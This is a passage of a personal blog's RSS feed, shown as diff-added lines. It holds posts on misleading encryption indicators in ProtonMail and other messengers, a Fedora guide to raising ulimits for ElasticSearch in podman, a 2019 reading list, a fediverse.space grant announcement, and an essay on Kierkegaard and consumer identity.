+&lt;p&gt;This isn&apos;t a problem with ProtonMail&apos;s technology; it&apos;s a problem with email. Fundamentally, the protocol wasn&apos;t built for end-to-end encryption. However, while ProtonMail&apos;s handling of this challenge is reasonable, the way they communicate it isn&apos;t. Take this text on their front page:&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;If you like arguing semantics, you might want to say that this is &lt;em&gt;technically&lt;/em&gt; true. All emails &lt;em&gt;are&lt;/em&gt; secured with end-to-end encryption once they&apos;re stored on ProtonMail&apos;s server. But this leaves out the pretty important fact that, like any email provider, ProtonMail has the ability to read your emails as they are received or sent (unless the recipient is also a ProtonMail user, or unless you manually set up a secure PGP channel).&lt;/p&gt;
+&lt;p&gt;Unless you&apos;re familar with the technical details of how email and encryption works, ProtonMail&apos;s UI is going to make you feel a lot more secure than you really are. Because every email is either end-to-end encrypted with PGP &lt;em&gt;or&lt;/em&gt; stored encrypted, the ProtonMail design team decided to throw little padlock indicators on everything:&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;It&apos;s in no way clear from the UI, but the first padlock icon (grey) means that the email was sent in plaintext. It&apos;s stored encrypted on ProtonMail&apos;s side, but the sender&apos;s email provider has full access to the email. The second padlock icon (greyish purple) means that the email was &lt;em&gt;actually&lt;/em&gt; end-to-end encrypted. As a user, you&apos;ll learn this if you hover over the padlock, but the key gotchas are not mentioned anywhere.&lt;/p&gt;
+&lt;p&gt;ProtonMail does actually provide the ability to send encrypted emails to other providers if you set a symmetric encryption key. You just have to notice the button with a lock on it and know that you have to manually set it up. Of course, if all you&apos;ve read is ProtonMail&apos;s marketing materials and their UI, you probably won&apos;t know that this is necessary to get the advertised security.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;I would love to see user studies of ProtonMail&apos;s security. If previous work gives us any indication, we can reasonably guess that a large proportion of users will not be aware that e.g. Google can read their emails when they send them to Gmail users. I would also love to be proven wrong on this: if you know of such research, please let me know!&lt;/p&gt;
+&lt;p&gt;I&apos;m not saying that anyone should stop using ProtonMail. But perhaps we should stop making unrealistic claims about what is possible, security-wise, for a protocol that was developed in the 90s for a very different world. Maybe we should look to &lt;a href=&quot;https://signal.org/docs/&quot;&gt;more&lt;/a&gt; &lt;a href=&quot;https://messaginglayersecurity.rocks/&quot;&gt;modern&lt;/a&gt; &lt;a href=&quot;https://gitlab.matrix.org/matrix-org/olm/blob/master/docs/megolm.md&quot;&gt;protocols&lt;/a&gt; for our secure communications needs. At the very least, please stop throwing a padlock icon on everything that has some relation to the abstract concept of &quot;security&quot;.&lt;/p&gt;
+</content:encoded></item><item><title>On mixing plaintext and encrypted messages</title><link>https://btao.org/posts/2020-05-28-sometimes-on-security/</link><guid isPermaLink="true">https://btao.org/posts/2020-05-28-sometimes-on-security/</guid><pubDate>Thu, 28 May 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Several security-focused messaging apps give users the ability to choose
+between two modes: unencrypted chats, or end-to-end encrypted ones that might
+lack certain features. This is an anti-pattern when it comes to usable
+security, and it brings some risks that are rarely discussed.&lt;/p&gt;
+&lt;p&gt;There are several different implementations of this mixing and matching of
+secure and insecure communications. Some chat apps default to unencrypted
+messages, but allow users to manually enable end-to-end encryption for
+certain threads. Others automatically start a secure channel if the
+recipient&apos;s client supports the right features -- a type of opportunistic
+encryption. Examples of the former include Telegram and Facebook Messenger:
+users must explicitly start a &quot;secret chat&quot; if they want end-to-end
+encryption. In the other category, you have apps like &lt;a href=&quot;https://delta.chat/en/&quot;&gt;Delta
+Chat&lt;/a&gt; -- an email-based instant messenger that uses
+&lt;a href=&quot;https://autocrypt.org/&quot;&gt;Autocrypt&lt;/a&gt; to automate PGP key distribution and
+message encryption. Even Signal, which is generally celebrated for its strong
+security, can be used as the default SMS app on Android phones -- allowing it
+to send plaintext text messages to contacts who don&apos;t use Signal. &quot;Secure&quot;
+email providers like ProtonMail also fall into this category.&lt;/p&gt;
+&lt;p&gt;This probably doesn&apos;t sound so bad. After all, encrypting &lt;em&gt;some&lt;/em&gt; messages is
+better than encrypting none, and users who have high security needs can just
+enable the encryption features they want, right? Unfortunately, this does not
+accurately represent how users understand and use secure communication tools.&lt;/p&gt;
+&lt;h2&gt;Communication problems&lt;/h2&gt;
+&lt;p&gt;The core problem is that communicating security features to end users is
+&lt;em&gt;hard&lt;/em&gt;. There are often nuances and conditions that are opaque unless you&apos;re a
+technical user with significant security knowledge. For example: in Delta
+Chat, messages are only encrypted if the recipient also uses a client with
+Autocrypt, and messages are never encrypted before you&apos;ve received a response
+(with the other party&apos;s public key as a header). It&apos;s not easy to inform
+users of these conditions, and the communication difficulties are not unique
+to Delta Chat: PGP without Autocrypt is famously opaque and difficult to
+use[^1] and key verification in modern messaging apps is often done
+incorrectly because users do not understand it[^2].&lt;/p&gt;
+&lt;p&gt;An obvious solution is to use indicators. Many apps use passive indicators
+that don&apos;t impede the users&apos; actions, but they let them know that some
+security feature is present or missing. The most common passive indicator is
+perhaps the lock icon in a browser toolbar indicating a HTTPS connection.
+However, studies show that thile users do look at passive indicators[^3],
+they are rarely heeded and do not change user behaviour[^4].&lt;/p&gt;
+&lt;p&gt;In Delta Chat, encrypted messages have a passive indicator in the form of a
+small lock icon, but unless you&apos;re looking out for it, you won&apos;t notice
+anything unusual about plaintext messages:&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;If your friend just told you to download a new, secure communication tool,
+you won&apos;t know that you have to look out for the lock icon or that you must
+enable a specific security feature in the settings. The app might try to tell
+you these things, but anyone who&apos;s ever seen people rapidly click through
+alerts to get to their goal knows that we can&apos;t rely on people reading these
+in detail. At this point, some might object that it isn&apos;t the app developers&apos;
+fault if users misrepresent its security features. This is true, but when we
+start implementing things like end-to-end encryption, we should expect this
+to happen and make sure that the app doesn&apos;t let users shoot themselves in
+the foot in terms of security.&lt;/p&gt;
+&lt;p&gt;High-risk users need their communications to be encrypted reliably, and
+expecting people to manually verify security features is unfortunately not
+very realistic. Telegram is a good example. It markets itself as a secure and
+private messenger, but defaults to using plaintext chats. In a usability
+study of Telegram, researchers found that while users felt they were using a
+secure tool, they were rarely (if ever) using secret chats. Most users did
+not understand the difference between the default chat mode and secret chats,
+and less than half used secret chats when asked to send sensitive
+information[^5].&lt;/p&gt;
+&lt;p&gt;All messengers that mix insecure and secure modes face the same problem.
+Their security relies on users understanding quite a few things, for example
+that a key exchange must happen over the initial messages (Delta Chat), or
+that messages will only be encrypted if the recipient uses a compatible
+client (Signal). Based on what we know from the field of usable security, we
+cannot expect end users to keep these security gotchas in mind. As
+developers, we should operate under the assumption that any such gotchas will
+be misunderstood or forgotten by a significant number of users.&lt;/p&gt;
+&lt;h2&gt;Binary thinking&lt;/h2&gt;
+&lt;p&gt;In 2017, The Guardian published an alarmist article claiming that WhatApp&apos;s
+encryption had a backdoor. This was not true -- their article was really
+about a reasonable tradeoff made by WhatsApp&apos;s developers to balance security
+with usability for its two billion users. Their article was quickly met with
+&lt;a href=&quot;http://technosociology.org/?page_id=1687&quot;&gt;an outcry from security
+professionals&lt;/a&gt;. These experts
+pointed out that The Guardian&apos;s flawed reporting had caused WhatsApp to be
+considered unsafe among some activists and journalists who were instead
+switching to far less secure alternatives like SMS. The lesson to be learned
+is that when developing messaging apps, we should strive for security that
+fits a straightforward mental model: secure or not secure. Of course there
+are nuances around threat models, but we must have a reasonable security
+baseline -- which it is impossible to provide if your app falls back to
+sending unencrypted messages.&lt;/p&gt;
+&lt;p&gt;There is also non-academic evidence that these are real risks. You&apos;ll find
+posts from users complaining that they unknowingly sent plaintext messages in
+&lt;a href=&quot;https://support.delta.chat/t/i-just-had-it-happen-that-messages-were-send-unencrypted/526&quot;&gt;Delta
+Chat&lt;/a&gt;
+and &lt;a href=&quot;https://github.com/signalapp/Signal-Android/issues/5531&quot;&gt;Signal&lt;/a&gt;. Others
+point out that email subject lines may &lt;a href=&quot;https://support.delta.chat/t/possible-thunderbird-gotcha/272&quot;&gt;leak the contents of otherwise
+encrypted
+messages&lt;/a&gt;[^6].
+A &lt;a href=&quot;https://www.vodafone.de/featured/apps/delta-chat-app-funktionen-e-mail-test/&quot;&gt;recent
+article&lt;/a&gt;
+on Delta Chat in a German magazine noted that &quot;of course, all messages are
+encrypted&quot; before showing a screenshot of an unencrypted chat.&lt;/p&gt;
+&lt;p&gt;I&apos;m all for raising the overall level of end-to-end encrypted communications
+on the internet, but we need to make sure that we recommend tools that are
+appropriate to users&apos; threat models, and that work for non-technical users.
+Opportunistic and optional encryption are useful for mitigating mass
+surveillance, but high-risk users must be confident that they won&apos;t
+inadvertently send confidential information over an insecure channel.
+Opportunistic and optional encryption cannot provide this guarantee.&lt;/p&gt;
+&lt;p&gt;[^1]: Whitten, Alma, and J. Doug Tygar. &quot;Why Johnny Can&apos;t Encrypt: A Usability Evaluation of PGP 5.0.&quot; &lt;em&gt;USENIX Security Symposium.&lt;/em&gt; Vol. 348. 1999.&lt;/p&gt;
+&lt;p&gt;[^2]: Schröder, Svenja, et al. &quot;When Signal hits the fan: On the usability and security of state-of-the-art secure mobile messaging.&quot; &lt;em&gt;European Workshop on Usable Security.&lt;/em&gt; IEEE. 2016.&lt;/p&gt;
+&lt;p&gt;[^3]: Whalen, Tara, and Kori M. Inkpen. &quot;Gathering evidence: use of visual security cues in web browsers.&quot; &lt;em&gt;Proceedings of Graphics Interface 2005&lt;/em&gt;. Canadian Human-Computer Communications Society, 2005.&lt;/p&gt;
+&lt;p&gt;[^4]: Schecter, Stuart, et al. &quot;The emperor’s new security indicators: An evaluation of website authentication and the effect of role playing on usability studies.&quot; &lt;em&gt;Proc. IEEE Symposium on Security and Privacy (S&amp;amp;P)&lt;/em&gt;. 2007. Cited in Whalen, Tara, and Kori M. Inkpen. &quot;Gathering evidence: use of visual security cues in web browsers.&quot; &lt;em&gt;Proceedings of Graphics Interface 2005&lt;/em&gt;. Canadian Human-Computer Communications Society, 2005.&lt;/p&gt;
+&lt;p&gt;[^5]: Abu-Salma, Ruba, et al. &quot;The security blanket of the chat world: An analytic evaluation and a user study of telegram.&quot; Internet Society, 2017.&lt;/p&gt;
+&lt;p&gt;[^6]: Any PGP client, no matter how usable and secure, will have to interface with the &lt;a href=&quot;https://blog.cryptographyengineering.com/2014/08/13/whats-matter-with-pgp/&quot;&gt;horrendous PGP ecosystem&lt;/a&gt;.&lt;/p&gt;
+</content:encoded></item><item><title>Running ElasticSearch in podman on Fedora 32</title><link>https://btao.org/posts/2020-04-20-elasticsearch-podman/</link><guid isPermaLink="true">https://btao.org/posts/2020-04-20-elasticsearch-podman/</guid><pubDate>Mon, 20 Apr 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;#tldr&quot;&gt;Jump the to the tl;dr.&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;So you just updated to Fedora 32, sat down to work, and realized that Docker wasn&apos;t working. Maybe at this point you vaguely remembered hearing about something called CgroupsV2 being a thing in Fedora 32, and maybe also something about Docker &lt;a href=&quot;https://github.com/docker/cli/issues/2104&quot;&gt;not playing nice with CgroupsV2&lt;/a&gt;. You kick yourself for a moment but decide that this is a good opportunity to get to grips with &lt;a href=&quot;https://podman.io/&quot;&gt;Podman&lt;/a&gt;. You could just turn off CgroupsV2 but it seems like working with Podman might make your future Fedora life a bit simpler.&lt;/p&gt;
+&lt;p&gt;Podman is only a quick &lt;code&gt;dnf install&lt;/code&gt; away, so you try the relatively straightforward command to run a container: &lt;code&gt;podman run -p &quot;9200:9200&quot; elasticsearch:6.8.8&lt;/code&gt;. It looks like it might even work, until...&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;using discovery type [zen] and host providers [settings]
+initialized
+starting ...
+publish_address {10.0.2.100:9300}, bound_addresses {[::]:9300}
+bound or publishing to a non-loopback address, enforcing bootstrap checks
+ERROR: [1] bootstrap checks failed
+[1]: max file descriptors [1024] for elasticsearch process is too low, increase to at least [65535]
+stopping ...
+stopped
+closing ...
+closed
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This isn&apos;t your first ElasticSearch rodeo so that error about max file descriptors looks familiar. Looks like you just have to bump your ulimit and everything should be fine! You check the soft limit and it is indeed low:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ ulimit -Sn
+1024
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So let&apos;s increase it. First, increase the system-wide limit for open file descriptors. Open &lt;code&gt;/etc/sysctl.conf&lt;/code&gt; and add the line&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;fs.file-max=131070
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Easy enough. We also need to increase the per-user limit, so we open &lt;code&gt;/etc/security/limits.conf&lt;/code&gt; and add&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;tao soft nofile 65535
+tao hard nofile 131070
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cool! The internet gurus tell you that this is all you need to do, so you log out and back in but...&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ ulimit -Sn
+1024
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It didn&apos;t work. Some more DuckDuckGo-ing suggests appending to &lt;code&gt;/etc/pam.d/login&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;session required pam_limits.so
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PAMs are slightly out of your wheelhouse but you read some &lt;a href=&quot;http://linux-pam.org/Linux-PAM-html/sag-pam_limits.html&quot;&gt;docs&lt;/a&gt; and things seem to make sense. Alas, neither logging out and in nor rebooting seems to make all the necessary changes take effect. You ask around in some IRC rooms and Fedora forums but with no luck. It looks like you aren&apos;t &lt;a href=&quot;https://unix.stackexchange.com/questions/428107/how-to-increase-the-maximum-number-of-open-files-on-fedora&quot;&gt;the only one who&apos;s had this problem&lt;/a&gt;. It&apos;s a good thing that you&apos;re working from home today because you are looking increasingly frazzled.&lt;/p&gt;
+&lt;p&gt;Eventually you find out that the limits &lt;em&gt;are&lt;/em&gt; in fact being applied, just not to the graphical login. Opening a shell and &lt;code&gt;su&lt;/code&gt;ing to your own account reveals the ulimit you&apos;d expect. Someone on &lt;a href=&quot;https://superuser.com/a/1200818/619546&quot;&gt;Stack Exchange&lt;/a&gt; tells you that this is because gnome-terminal is started by systemd, which does not read from &lt;code&gt;limits.conf&lt;/code&gt;. The final step is to write to both &lt;code&gt;/etc/systemd/user.conf&lt;/code&gt; and &lt;code&gt;/etc/systemd/system.conf&lt;/code&gt; and append&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;DefaultLimitNOFILE=131070
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;or whatever your soft and hard limit should be, respectively.&lt;/p&gt;
+&lt;p&gt;You reboot a final time and, ta-da:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ ulimit -Sn
+65535
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You excitedly start the ElasticSearch container again, but &lt;code&gt;max file descriptors [1024] for elasticsearch process is too low, increase to at least [65535]&lt;/code&gt; rears its ugly head once again. A final search tells you that you have to run&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;podman run --ulimit=host -p &quot;9200:9200&quot; elasticsearch:6.8.8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You have never been this relieved to see an ElasticSearch container start up.&lt;/p&gt;
+&lt;h2&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;Append &lt;code&gt;/etc/systemd/user.conf&lt;/code&gt; and &lt;code&gt;/etc/systemd/system.conf&lt;/code&gt; with your soft and hard limit, respectively:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;DefaultLimitNOFILE=131070
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then append the following to &lt;code&gt;/etc/security/limits.conf&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;tao soft nofile 65535
+tao hard nofile 131070
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Reboot. Then you can run &lt;code&gt;podman run --ulimit=host -p &quot;9200:9200&quot; elasticsearch:6.8.8&lt;/code&gt;.&lt;/p&gt;
+</content:encoded></item><item><title>Books I enjoyed in 2019</title><link>https://btao.org/posts/2019-12-31-reading/</link><guid isPermaLink="true">https://btao.org/posts/2019-12-31-reading/</guid><pubDate>Tue, 31 Dec 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;m not one of those people who constantly has their head buried in a book -- one
+of those at heightened risk of falling down a manhole because they are reading
+while walking instead of looking in front of them. A part of the reason is that
+I tend to gravitate towards denser books -- the type of book that
+feels Important, and that might prompt impressed nods when I bring it up to my
+philosopher friends. This is a bad habit. It means that I just end up doing
+something else that isn&apos;t reading. One of my resolutions for the new year is to
+read for enjoyment rather than for some imagined book CV. In that spirit, I
+wanted to write up a list of some of the reads I enjoyed the most this year.&lt;/p&gt;
+&lt;h2&gt;Consider the Lobster by David Foster Wallace&lt;/h2&gt;
+&lt;p&gt;There&apos;s a kindness that permeates all of DFW&apos;s writing and this essay
+collection is no exception.&lt;/p&gt;
+&lt;h2&gt;Rosewater by Tade Thompson&lt;/h2&gt;
+&lt;p&gt;Really good African sci-fi. The sequel is just as good as the this
+first book, and as I&apos;m writing this I&apos;m realizing that the trilogy&apos;s
+finale was published a few months ago!&lt;/p&gt;
+&lt;h2&gt;The Dispossessed by Ursula K. Le Guin&lt;/h2&gt;
+&lt;p&gt;I continued my mid-year sci-fi streak with this classic, and it didn&apos;t
+disappoint. This is one of those books that you want to lend to all
+your friends the moment you&apos;ve finished it.&lt;/p&gt;
+&lt;h2&gt;October by China Miéville&lt;/h2&gt;
+&lt;p&gt;I&apos;ve never read a history book as gripping as this one. Miéville tells
+the story of the 1917 October revolution in an almost cinematic way. A
+friend once described this book as &quot;god-tier&quot; and he wasn&apos;t wrong.&lt;/p&gt;
+&lt;h2&gt;The Wretched of the Earth by Frantz Fanon&lt;/h2&gt;
+&lt;p&gt;This is the book that challenged (and taught) me the most. I read it
+with a reading group and I&apos;m glad -- every chapter prompted a &lt;em&gt;lot&lt;/em&gt; of
+discussion, and I would not have gotten as much out of it without others.&lt;/p&gt;
+</content:encoded></item><item><title>fediverse.space awarded NGI Zero grant</title><link>https://btao.org/posts/2019-08-22-fediverse-space-nlnet/</link><guid isPermaLink="true">https://btao.org/posts/2019-08-22-fediverse-space-nlnet/</guid><pubDate>Thu, 22 Aug 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;My project &lt;a href=&quot;https://www.fediverse.space&quot;&gt;fediverse.space&lt;/a&gt; is an interactive map
+of the fediverse. The fediverse, or &quot;federated universe&quot;, is the set of social
+media servers, hosted by individuals across the globe, forming a libre and more
+democratic alternative to traditional social media.&lt;/p&gt;
+&lt;p&gt;I&apos;m proud to say that this project was recently awarded a grant from the &lt;a href=&quot;https://nlnet.nl/discovery&quot;&gt;NGI
+Zero Discovery&lt;/a&gt; project. NGI Zero Discovery, funded
+by the European Commission, works towards creating an open, trustworthy, and
+reliable internet for all by funding R&amp;amp;D projects that improve search and
+discovery:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Search should not be a gatekeeper, a black box or a privacy nightmare. If
+the internet is the equivalent of a global brain, we need creativity and
+diversity in the pathways across that brain to unlock its true potential.
+Search and discovery are basic human needs for humans of all ages, and we
+would like to put powerful new technology in the hands of future generations
+as building blocks for a fair and democratic society and an open economy
+that benefits all.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Thanks to this funding, I have been able to spend this summer bringing
+fediverse.space to its full potential. The initial proof-of-concept has been
+rewritten to be far more reliable, performant, and extendable. In addition, it
+now supports far more of the server implementations seen across the fediverse.
+There&apos;s still more to come -- &lt;a href=&quot;https://mastodon.social/@fediversespace&quot;&gt;follow the project on
+Mastodon&lt;/a&gt; to stay up-to-date!&lt;/p&gt;
+</content:encoded></item><item><title>Self and Lack Thereof: On Kierkegaard and Capitalism</title><link>https://btao.org/posts/2016-08-31-kierkegaard-capitalism/</link><guid isPermaLink="true">https://btao.org/posts/2016-08-31-kierkegaard-capitalism/</guid><description>How Kierkegaard predicted normcore</description><pubDate>Wed, 31 Aug 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In the age of social media, identity is becoming increasingly fluid and fragmented: with greater access to information comes more exposure to new perspectives and personalities, and for every side of our selves, there is a channel to express it and an audience at the ready. This explosion of identities fits neatly into the logic of consumer capitalism: more identities means more markets. Thus, identity fluidity – a concept that has liberatory potential – ends up reinforcing existing capitalist structures. Søren Kierkegaard, as one of the early experts on identity, presents a useful lens to explore this contradiction.&lt;/p&gt;
+&lt;h3&gt;Crop Rotation&lt;/h3&gt;
+&lt;p&gt;Kierkegaard explored the idea of an ever-changing personality both explicitly and implicitly. It is notoriously difficult to find a consistent self or author behind his works as his use of pseudonyms and irony often obscures his point of view. In Either/Or, behind the pseudonyms of A and B, he argues for the merits of the aesthetic and ethical lifestyles, respectively. In one chapter, Crop Rotation, the aesthete A works from the axiom that all people are “tedious.” A argues against the maxim that idleness is the root of all evil – in fact, idleness can be a marvelous thing! Instead, it is tedium that makes people wicked and therefore attempts to overcome it are only natural. His solution is “crop rotation”: continually changing one’s experience of the world by taking on new subjectivities.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;One must also continually vary oneself; this is the secret. For this, it is necessary to have control over one&apos;s moods. In the sense of being able to generate them at will, this is an impossibility, but wisdom learns to utilize the moment. […] One must know how a mood affects oneself and is likely to affect others before taking it on.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;In other words, tedium (and thus evil) is combated by continually changing one&apos;s self and one&apos;s moods. This is not a straightforward task: the ability to change one’s subjective experience requires a meta-awareness of, and ironic distance to, life. Once there is irony, it becomes difficult to place anything A writes – for any given passage, the reader cannot be confident that A would sincerely endorse it, and it is even less clear whether Kierkegaard would. In this way, just a bit of ironic distance can give the subject a high degree of freedom – if you know that they do not mean what they are saying, there is the potential for them to mean anything! A&apos;s lack of commitment to having a self, to making choices, and to ethics means that his potential is almost infinite. By committing, he would have “everything to lose, nothing to gain.” However, this freedom is of a negative form: it is freedom from meaning and from the limitations that come with a singular, consistent self, but it is not a freedom to do anything.&lt;/p&gt;
+&lt;h3&gt;Youth &amp;amp; normcore&lt;/h3&gt;
+&lt;p&gt;Identities are becoming more fluid and fit less into the stereotypical molds that we were once used to. A culture where irony is everywhere, coupled with easy access to thousands of communities online, has made it possible for the Internet generation to explore many different subcultures and their corresponding identities in a short amount of time. A good example of this was normcore. Today&apos;s consumers want to experience all the different (and quite possibly inconsistent) sides to their identity (particularly through their consumer choices, but not exclusively so). The marketing company that coined the term described normcore as:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;the freedom to be with anyone. […] Normcore moves away from a coolness that relies on difference to a post-authenticity coolness that opts in to sameness. […] Your consumer choices aren’t irrelevant, they’re just temporary. People compromise, people are inconsistent. Making one choice today and a conflicting choice tomorrow doesn’t make you a hypocrite. It just makes you complex.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The contemporary consumer&apos;s goal is to be able to fit in whether she is chanting with hooligans at a football match, listening to a lecture on gender studies, or going to a rave on a Monday night. It is not just the freedom to choose a superficial persona, but the freedom to try out the different underlying identity. Crucially, having these multiple identities means that the subject no longer belongs to just one group of consumers. Normcore causes market growth by breaking down the distinctions between markets – suddenly, the football fans are buying punk clothes, and the punks are buying football tickets. Normcore fuels capitalism by encouraging consumption of an even wider range of products.&lt;/p&gt;
+&lt;p&gt;BuzzFeed is one of the most apt embodiments of normcore. The driving factor behind BuzzFeed&apos;s success is its habit of publishing posts that appeal to ultra-specific parts of visitors&apos; personalities. On any given day, the front page displays posts such as &quot;16 Things Only Competitive People In A Relationship Can Relate To&quot;, &quot;24 Things That Close All-Girl Friend Groups Understand&quot; and &quot;17 Hard Truths About Growing Up Vegetarian&quot;: readers have to relate to many different identities in a short amount of time. Before he founded BuzzFeed, Jonah Peretti critiqued this phenomenon in a 1996 paper titled Capitalism and Schizophrenia. His paper describes the process of identity formation that has made the site so popular and shows how this is both necessary for, and a result of, advanced capitalism.&lt;/p&gt;
+&lt;h3&gt;Identity under capitalism&lt;/h3&gt;
+&lt;p&gt;Peretti makes a Lacanian interpretation of these identity formations. In particular, he looks at the mirror stage of a child’s development – the stage at which an infant, before she has developed a unified ego, begins to notice her reflection and identify herself with it. Before this (which occurs at roughly six months of age) the infant will not recognize the reflection as being of herself. The mirror reflection shows a complete, consistent body that is different from the child&apos;s turbulent and fragmented experience of reality thus far. The reflection represents the “Ideal-I” that the child will spend the rest of her life trying to attain (though this is an impossible quest). When the infant first recognizes herself and her “Ideal-I,” a desire for the Other is born that did not exist before. It is because she lacks this idealized self that she desires it. Mirror stage identification does not require a literal reflection in a mirror – it can also occur when the infant sees another child, for instance. Nor is this form of identification unique to infants. It is the same process that makes us identify with the main character in a film or book.&lt;/p&gt;
+&lt;p&gt;At this point, it has become a cliché to say that an advertisement does not sell a product; it sells a lifestyle – though it might be more accurate to say that it sells an identity. For an ad to be effective, the subject has to identify with it (in the Lacanian, mirror-stage sense). We buy Nike shoes not because they are the best running shoes, but because the runner in the ad induces an ego formation in us that makes the shoes vital to our self-perception as active, sporty individuals. We are faced with hundreds of these identifications in a single day on TV, the internet, newspapers, magazines, posters, and so on. We form identifications with the characters in our favorite TV show, with the supermodels on the subway advertisements, and with the musician on Spotify. The critical thing to note is not necessarily the content of these images, but the fact that the rate at which we assume identities is increasing, and that we are assuming them with greater efficiency. Many of these identifications encourage us to buy a product by inducing a sense of lack and coupled with the increasing ease of spending money (such as credit cards and online shopping), global consumption is increasing rapidly. In this way, these extremely rapid Lacanian identifications fuel consumer capitalism:
+The increasingly rapid rate at which images are distributed and consumed in late capitalism necessitates a corresponding increase in the rate that individuals assume and shed identities. Because advertisements link identity with the need to purchase products, the acceleration of visual culture promotes the hyper-consumption associated with late capitalism.&lt;/p&gt;
+&lt;p&gt;The ease with which we form these egos means that they are not very deeply seated – they fade away fast to make room for the next identification. When there are too many mirror-stage identifications, the effect is that of two mirrors facing each other: an infinite number of selves are created, continuing into the fading horizon. They are far from sophisticated and encourage breadth of experience rather than depth. This is notably similar to the criticism that Kierkegaard’s pseudonym B directs at A in the second part of Either/Or.&lt;/p&gt;
+&lt;p&gt;Before B’s criticisms become relevant, we need to establish how A&apos;s texts relate to these mirror-stage identifications. A&apos;s crop rotation is done to fight tedium: for excitement. In contrast, the Lacanian “crop rotation” that Peretti discusses is not necessarily a conscious process. It is something that we do automatically when faced with a dissonant host of images in media and advertising. When it is conscious (as it is in normcore), fighting boredom is only one of the reasons behind it – the other is a rejection of cultural pressure to be a unique, yet predictable, individual. Normcore does have one thing in common with A: the dismissal of a search for authenticity, which in both cases is seen as limiting. A does not explicitly advocate the kind of rapid identity assumption seen in Peretti&apos;s paper – he does not go quite that far – but it is probable that he would be sympathetic to the goals of normcore. Normcore takes the vast set of images and identities created by capitalism and embraces them all, without committing to any single one of them. A&apos;s philosophy will appeal to the normcore millennial because the normcore millennial is already living it in its most extreme form. Because this rapid and superficial identity assumption is in some ways reminiscent of A&apos;s texts, we can look to the second half of Either/Or as well as other texts by Kierkegaard for a more in-depth understanding.&lt;/p&gt;
+&lt;h3&gt;Kierkegaardian perspectives&lt;/h3&gt;
+&lt;p&gt;In Either/Or, the ethicist B is confident that A&apos;s aesthetic life is spiritually void:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Can you imagine anything more terrifying than seeing your being dissolved into a multiplicity, than seeing yourself truly become many, becoming a miserable, demonic legion, and thus losing the innermost, holiest in a person, the binding force of the personality?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;B’s ultimate aim is authenticity through a consistent identity, doing one&apos;s duty, and making choices that are compatible with one&apos;s ethical code. It is not possible to be genuinely oneself without embracing the deepest identity hiding beneath the multiple ironic personas, and embracing this identity means allowing ethical considerations into one&apos;s life. This advice will not do much for the millennial since the imagery of consumer capitalism generates identity assumptions that are instant, automatic and unnoticed – the average consumer today would reject B’s advice on the grounds that they do not need it, that they are obviously only one person. Even in the case of normcore, where the multiplicity is intentional, the advice does not have much of an impact: normcore was articulated as an alternative to the struggle for authenticity, which it sees as continuing indefinitely without ever reaching its goal. A different approach is found later in B’s half of Either/Or:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;He now discovers that the &apos;Self&apos; he chooses has an infinite multiplicity within it because it has a history, a history in which he acknowledges the identity in himself. This history is of an unusual kind because in this history he stands in relation to other individuals in his lineage and to the lineage itself, and this history includes pain, yet he is only the one he is by this history.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Appealing to the multiplicity within a consistent self is more likely to get a positive response from the normcore millennial. B presents a singular yet multifaceted view of the self that does not limit identity to just a series of temporary personas (an either/or) but instead allows an individual to explore the various sides to her true self (a both/and). A profound sense of this self could mean that the subject can resist the mirror-stage identifications asked of them by advertisements and other media. If not, perhaps it could allow them to withstand at least the desire for consumption created by the ads.&lt;/p&gt;
+</content:encoded></item></channel></rss>
